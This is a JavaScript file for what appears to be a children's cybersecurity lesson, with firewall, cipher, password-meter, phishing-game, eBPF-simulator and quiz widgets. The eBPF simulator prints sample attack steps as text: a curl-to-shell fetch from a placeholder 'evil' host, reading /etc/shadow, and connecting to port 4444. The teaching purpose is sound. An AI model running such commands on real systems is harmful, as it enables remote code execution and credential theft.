        el.style.transition = 'opacity .6s'; el.style.opacity = 0;
        bubble(); setTimeout(() => el.remove(), 700); onDone && onDone(false); return;
      }
      const p = path.getPointAtLength(L * f);
      el.setAttribute('transform', `translate(${p.x} ${p.y - 4 * Math.sin(k * 30)})`);
      if (k < 1) requestAnimationFrame(tick); else { setTimeout(() => el.remove(), 300); onDone && onDone(true); }
    })(t0);
  }
  const acts = {
    good() { say('info', '→ packet from YOU to game-server:443 "hi friend!"'); packet({ emoji: '📨', col: '#7ff0cc', onDone: () => say('ok', '✓ firewall rule "allow outgoing web" → delivered! 🎉') }); },
    secure() {
      say('info', '→ packet from YOU (HTTPS, encrypted)');
      packet({ emoji: '🔒', col: '#a8d1ff', label: 'x9$#qZ!', onDone: () => { say('ok', '✓ delivered. A spy on the way saw only: "x9$#qZ!&@1p" 🤷'); say('ok', '✓ server unlocked it with its private key 🗝️'); } });
    },
    evil() { say('info', '← packet from 203.0.113.66 to YOUR laptop port 4444 (unknown!)'); packet({ emoji: '💣', col: '#ffc2d1', reverse: true, blockAt: fwAt, onDone: () => say('bad', '✗ BLOCKED: no rule allows incoming port 4444. Virus stopped at the gate! 🧱') }); },
    flood() {
      say('bad', '⚠ 20 packets/ms from 300 different hacked machines…');
      let n = 0;
      for (let i = 0; i < 14; i++) setTimeout(() => packet({ emoji: '👾', col: '#c9b3ff', reverse: true, speed: 1600, blockAt: fwAt, onDone: () => { if (++n === 14) say('ok', '✓ rate-limit rule dropped 14/14 flood packets. Server is still happy 😌'); } }), i * 90);
    },
  };
  $$('[data-pkt]').forEach(b => b.onclick = () => acts[b.dataset.pkt]());
})();

/* =========================================================
   CAESAR CIPHER
   ========================================================= */
(function cipher() {
  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const inp = $('#plain'), sl = $('#shift'), out = $('#cipherOut'), wheel = $('#cipherWheel');
  function enc(s, k) { return s.toUpperCase().replace(/[A-Z]/g, c => A[(A.indexOf(c) + k) % 26]); }
  function drawWheel(k) {
    let h = `<circle cx="130" cy="130" r="122" fill="#ffd23f" stroke="#23243a" stroke-width="3"/><circle cx="130" cy="130" r="86" fill="#fff" stroke="#23243a" stroke-width="3"/><circle cx="130" cy="130" r="50" fill="#ff4f8b" stroke="#23243a" stroke-width="3"/>`;
    for (let i = 0; i < 26; i++) {
      const a = i / 26 * Math.PI * 2 - Math.PI / 2;
      h += `<text x="${130 + Math.cos(a) * 104}" y="${134 + Math.sin(a) * 104}" text-anchor="middle">${A[i]}</text>`;
      h += `<text x="${130 + Math.cos(a) * 68}" y="${134 + Math.sin(a) * 68}" text-anchor="middle" fill="#8338ec">${A[(i + k) % 26]}</text>`;
    }
    h += `<text x="130" y="128" text-anchor="middle" fill="#fff" style="font-size:12px">KEY</text><text x="130" y="148" text-anchor="middle" fill="#fff" style="font-size:20px">+${k}</text>`;
    h += `<path d="M130 4 l-8 -0 l8 14 l8 -14z" fill="#ef233c" stroke="#23243a" stroke-width="2"/>`;
    wheel.innerHTML = h;
  }
  function upd() { const k = +sl.value; $('#shiftVal').textContent = k; out.textContent = enc(inp.value, k) || '…'; drawWheel(k); }
  inp.oninput = sl.oninput = upd; upd();
})();

/* =========================================================
   PASSWORD METER
   ========================================================= */
(function pw() {
  const COMMON = ['123456', 'password', '123456789', 'qwerty', '12345678', '111111', '1234567', 'iloveyou', 'abc123', 'password1', 'admin', 'letmein', 'welcome', 'monkey', 'dragon', 'football', 'baseball', 'sunshine', 'princess', 'qwerty123', '000000', 'minecraft', 'pokemon', 'superman', 'batman', 'cat', 'dog'];
  const inp = $('#pw'), bar = $('#pwBar'), out = $('#crackTime');
  function fmt(sec) {
    if (sec < 1) return '⚡ instantly! 😱';
    const u = [['seconds', 60], ['minutes', 60], ['hours', 24], ['days', 365], ['years', 1000], ['thousand years', 1000], ['million years', 1000], ['billion years', 1e99]];
    let v = sec, i = 0;
    while (i < u.length - 1 && v >= u[i][1]) { v /= u[i][1]; i++; }
    if (i === u.length - 1 && v > 1000) return '♾️ longer than the universe has existed 🌌';
    return `${Math.round(v)} ${u[i][0]}`;
  }
  inp.oninput = () => {
    const p = inp.value;
    const c = { len: p.length >= 12, lower: /[a-z]/.test(p), upper: /[A-Z]/.test(p), num: /\d/.test(p), sym: /[^A-Za-z0-9]/.test(p), common: p && !COMMON.includes(p.toLowerCase()) };
    $$('#pwChecks li').forEach(li => li.classList.toggle('ok', !!c[li.dataset.c]));
    if (!p) { out.textContent = '⌨️ start typing!'; bar.style.width = 0; return; }
    let pool = (c.lower ? 26 : 0) + (c.upper ? 26 : 0) + (c.num ? 10 : 0) + (c.sym ? 33 : 0);
    let bits = p.length * Math.log2(pool || 1);
    if (!c.common) bits = 2;
    if (/^(.)\1+$/.test(p)) bits = Math.min(bits, 8);
    const sec = Math.pow(2, bits) / 2 / 1e10; // 10 billion guesses / second
    out.textContent = fmt(sec);
    const pct = Math.min(100, bits / 90 * 100);
    bar.style.width = pct + '%';
    bar.style.background = pct < 35 ? '#ef233c' : pct < 60 ? '#fb5607' : pct < 80 ? '#ffd23f' : '#06d6a0';
  };
})();

/* =========================================================
   PHISHING GAME
   ========================================================= */
(function phish() {
  const found = new Set();
  $$('.email .flag').forEach(f => f.addEventListener('click', () => {
    const n = f.dataset.f;
    if (found.has(n)) return;
    found.add(n); f.classList.add('found'); f.dataset.n = n;
    $(`#flagList li[data-f="${n}"]`).classList.add('found');
    $('#flagCount').textContent = found.size;
    if (found.size === 6) { $('#phishWin').style.display = 'block'; confetti(); }
  }));
})();

/* =========================================================
   eBPF SIMULATOR
   ========================================================= */
(function ebpf() {
  const NS = 'http://www.w3.org/2000/svg';
  const term = $('#ebpfTerm'), dots = $('#ebpfDots'), tog = $('#ebpfToggle'), enf = $('#ebpfEnforce');
  const APPX = [95, 230, 370], HOOKX = [95, 230, 370];
  const HOOK = { exec: 0, open: 1, connect: 2 };
  let ts = 0;
  function line(cls, txt) {
    const d = document.createElement('div'); d.className = cls; d.textContent = txt; term.appendChild(d);
    while (term.children.length > 60) term.firstChild.remove();
    term.scrollTop = term.scrollHeight;
  }
  function stamp() { ts += rand(.1, .9); return ts.toFixed(2).padStart(7, ' '); }
  function flash(i, col) { const h = $('#hook' + i); h.setAttribute('fill', col); setTimeout(() => h.setAttribute('fill', '#fff'), 500); }
  function fly(fromX, toX, fromY, toY, col, ms = 700) {
    return new Promise(res => {
      const c = document.createElementNS(NS, 'circle'); c.setAttribute('r', 8); c.setAttribute('fill', col); c.setAttribute('stroke', '#23243a'); c.setAttribute('stroke-width', 2);
      dots.appendChild(c); const t0 = performance.now();
      (function tick(now) { const k = Math.min(1, (now - t0) / ms); c.setAttribute('cx', fromX + (toX - fromX) * k); c.setAttribute('cy', fromY + (toY - fromY) * k); if (k < 1) requestAnimationFrame(tick); else { c.remove(); res(); } })(t0);
    });
  }
  async function event(app, kind, detail, evil = false) {
    const h = HOOK[kind];
    await fly(APPX[app], HOOKX[h], 132, 235, evil ? '#ef233c' : '#06d6a0');
    const names = ['browser', 'game', 'sneaky.bin'];
    if (!tog.checked) {
      if (evil) line('t-dim', `${stamp()}  ??? something happened… nobody was watching 🙈`);
      return true;
    }
    flash(h, evil ? '#ffc2d1' : '#d6fbef');
    fly(HOOKX[h], 560, 235, 250, '#ffd23f', 500);
    if (!evil) { line('t-ok', `${stamp()}  ${kind.padEnd(7)} ${names[app].padEnd(10)} ${detail}  ✓ normal`); return true; }
    if (enf.checked) { line('t-alert', `${stamp()}  ${kind.padEnd(7)} ${names[app].padEnd(10)} ${detail}  🛑 BLOCKED by eBPF-LSM`); return false; }
    line('t-warn', `${stamp()}  ${kind.padEnd(7)} ${names[app].padEnd(10)} ${detail}  🚨 ALERT! suspicious`);
    return true;
  }
  const NORMAL = [[0, 'connect', 'example.com:443'], [1, 'open', '/home/kid/save.dat'], [0, 'open', '~/Downloads/homework.pdf'], [1, 'connect', 'game-server:7777'], [0, 'exec', '/usr/bin/browser-helper']];
  let visible = false;
  new IntersectionObserver(es => visible = es[0].isIntersecting).observe($('#ebpfSvg'));
  setInterval(() => { if (visible && !busy) { const e = NORMAL[Math.floor(rand(0, NORMAL.length))]; event(...e); } }, 1500);

  tog.onchange = () => {
    $('#bees').setAttribute('opacity', tog.checked ? 1 : 0);
    line(tog.checked ? 't-ok' : 't-dim', tog.checked ? '$ bpftool prog load guard.o  → verifier: ✓ safe! 🐝 guards attached to 4 hooks' : '$ guards unloaded. nobody is watching 🙈');
  };
  enf.onchange = () => line('t-dim', enf.checked ? '# block mode ON: guards can say "NO!"' : '# watch-only mode: guards just shout alerts');

  let busy = false;
  $('#ebpfAttack').onclick = async () => {
    if (busy) return; busy = true;
    const steps = [['exec', '/bin/sh -c "curl evil | sh"'], ['open', '/etc/shadow  (password file!)'], ['connect', '203.0.113.66:4444  (hacker server)']];
    let allOk = true;
    for (const [k, d] of steps) {
      const ok = await event(2, k, d, true);
      if (!ok) { allOk = false; line('t-ok', '        🎉 attack stopped in its tracks. sneaky.bin can\'t do anything.'); break; }
      await sleep(350);
    }
    if (allOk && !tog.checked) line('t-alert', '        😱 the hacker stole the password file and nobody noticed! Try turning the guards on.');
    else if (allOk) line('t-warn', '        📣 admins were alerted and are on their way! (turn on Block mode to stop it instantly)');
    busy = false;
  };

  // XDP flood demo
  let flooding = null;
  $('#xdpBtn').onclick = () => {
    if (flooding) { clearInterval(flooding); flooding = null; $('#xdpBtn').textContent = '🌊 Start flood'; return; }
    $('#xdpBtn').textContent = '⏹ Stop flood';
    let inc = 0, drop = 0, pass = 0;
    flooding = setInterval(() => {
      const junk = Math.round(rand(9000, 12000)), real = Math.round(rand(80, 120));
      inc += junk + real;
      if ($('#xdpToggle').checked) { drop += junk; pass += real; $('#cpuLoad').textContent = Math.round(rand(8, 15)) + '% 😌 calm'; }
      else { pass += Math.round(real * rand(.05, .2)); $('#cpuLoad').textContent = Math.round(rand(96, 100)) + '% 🔥 melting! real users can\'t get in'; }
      const max = Math.max(inc, 1);
      $('#barIn').style.height = '100%';
      $('#barDrop').style.height = Math.max(3, drop / max * 100) + '%';
      $('#barPass').style.height = Math.max(3, pass / max * 100 * 40) + '%';
      $('#barInL').textContent = (inc / 1000).toFixed(0) + 'k'; $('#barDropL').textContent = (drop / 1000).toFixed(0) + 'k'; $('#barPassL').textContent = pass;
    }, 250);
  };
})();

/* =========================================================
   QUIZ
   ========================================================= */
(function quiz() {
  const Q = [
    ['You get a text: "You won a free phone! Click now, offer ends in 5 minutes!" What do you do?', ['Click fast before it ends!', 'Ignore/delete it, it\'s a phishing trick', 'Forward it to all my friends'], 1, 'Panic + prize = classic phishing. Real prizes don\'t rush you.'],
    ['Which password is strongest?', ['password123', 'Fluffy2010', 'BlueGiraffeDances4Pizza!'], 2, 'Long + random words + numbers + symbols = centuries to crack.'],
    ['What does the 🔒 next to a website address mean?', ['The site is encrypted (HTTPS)', 'The site is locked forever', 'The site is for adults only'], 0, 'It means the magic padlock is scrambling what you send.'],
    ['Your computer says "Update available". Best move?', ['Never update, it\'s annoying', 'Update soon, it fixes security holes', 'Turn off the computer forever'], 1, 'Updates are patches that close the doors hackers use.'],
    ['Ransomware locked your files. What saves you?', ['Backups!', 'Crying', 'Buying a new mouse'], 0, 'With a backup you just restore and the villain gets nothing.'],
    ['What does eBPF let security folks do?', ['Make games run in 4K', 'Run tiny safe guard programs inside the kernel to watch & block bad actions', 'Delete the internet'], 1, 'Little 🐝 guards at the kernel doors, no reboot needed!'],
    ['Someone calls saying "I\'m from IT, tell me your password". You…', ['Tell them, they sound nice', 'Hang up and check with IT another way', 'Give them half the password'], 1, 'That\'s social engineering. Nobody legit needs your password.'],
    ['Which is NOT part of the CIA triad?', ['Confidentiality', 'Integrity', 'Instagram'], 2, 'C-I-A = Confidentiality, Integrity, Availability. 😄'],
    ['Authentication vs authorization: which is "what you\'re allowed to do"?', ['Authentication', 'Authorization', 'Decoration'], 1, 'Authentication = who you are. Authorization = what you may do.'],
    ['Which link really belongs to megagame.com?', ['https://megagame.com.prize.xyz/login', 'https://support.megagame.com/help', 'https://rnegagame.com/login'], 1, 'The real owner is right before the first "/". support.megagame.com → megagame.com ✅'],
    ['Why do good websites store a HASH of your password?', ['So hackers who steal it can\'t easily get your real password', 'To make the website faster', 'Because hashes look cool'], 0, 'A hash is a one-way fingerprint: you can\'t un-blend the smoothie! 🥤'],
    ['A flashlight app asks to read your contacts. You…', ['Allow, it\'s probably fine', 'Deny, a flashlight doesn\'t need contacts', 'Delete your contacts'], 1, 'Only give apps what they need: least privilege!'],
    ['A voice call sounds like your uncle asking for gift card codes, fast. Smart move?', ['Send the codes quickly', 'Hang up and call him back on his real number', 'Ask him to send a selfie'], 1, 'AI can fake voices. Always double-check through another way.'],
    ['Your account got hacked. Which password do you change FIRST?', ['Your email password', 'Your game password', 'Your Wi-Fi password'], 0, 'Email is the master key: it can reset all your other accounts.'],
  ];
  let i = 0, score = 0;
  const box = $('#quizBox'), dots = $('#quizDots');
  dots.innerHTML = Q.map(() => '<i></i>').join('');
  function show() {
    $$('#quizDots i').forEach((d, k) => d.classList.toggle('c', k === i && !d.classList.contains('r') && !d.classList.contains('w')));
    if (i >= Q.length) {
      const msg = score === Q.length ? '🏆 PERFECT! You\'re a certified Cyber Hero!' : score >= Q.length * .75 ? '🌟 Awesome! Almost a pro!' : '💪 Good try! Scroll up and try again!';
      box.innerHTML = `<h3 class="center">${score} / ${Q.length}</h3><p class="center scribble">${msg}</p><p class="center"><button class="btn pink" id="qAgain">Play again 🔁</button></p>`;
      $('#qAgain').onclick = () => { i = 0; score = 0; $$('#quizDots i').forEach(d => d.className = ''); show(); };
      if (score >= Q.length * .75) confetti(120);
      return;
    }
    const [q, opts, ans, why] = Q[i];
    box.innerHTML = `<div class="quiz-q">Q${i + 1}. ${q}</div><div class="quiz-opts">${opts.map((o, k) => `<button data-k="${k}">${String.fromCharCode(65 + k)}. ${o}</button>`).join('')}</div><div class="quiz-explain"></div>`;
    $$('.quiz-opts button', box).forEach(b => b.onclick = () => {
      const k = +b.dataset.k, ok = k === ans;
      $$('.quiz-opts button', box).forEach(x => { x.disabled = true; if (+x.dataset.k === ans) x.classList.add('right'); });
      if (!ok) b.classList.add('wrong'); else score++;
      $$('#quizDots i')[i].className = ok ? 'r' : 'w';
      $('.quiz-explain', box).innerHTML = `${ok ? '✅ Yes!' : '❌ Oops!'} ${why} <button class="btn teal" style="margin-left:.6rem">Next →</button>`;
      $('.quiz-explain .btn', box).onclick = () => { i++; show(); };
    });
  }
  show();
})();

/* ---------- pledge ---------- */
(function pledge() {
  const boxes = $$('#pledgeList input');
  let done = false;
  boxes.forEach(b => b.onchange = () => {
    const n = boxes.filter(x => x.checked).length;
    $('#badgeMsg').textContent = n === boxes.length ? '🎉 Badge earned! You\'re a Cyber Hero!' : `${n} / ${boxes.length} promises`;
    $('#badge').classList.toggle('earned', n === boxes.length);
    if (n === boxes.length && !done) { done = true; confetti(150); }
    if (n < boxes.length) done = false;
  });
})();

observeReveals();
